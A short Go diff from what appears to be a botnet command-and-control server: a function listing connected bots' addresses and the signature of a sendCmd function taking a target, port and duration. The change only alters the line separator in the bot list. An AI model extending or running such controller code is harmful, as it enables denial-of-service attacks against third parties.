@@ -20,7 +20,7 @@ func GetBots() (int, string) {
 			bots = append(bots, addr.IP.String()+":"+strconv.Itoa(addr.Port))
 		}
 	}
-	return len(bots), strings.Join(bots, "\n")
+	return len(bots), strings.Join(bots, "\n\r")
 }
 
 func sendCmd(command_type string, target string, port string, duration string) {
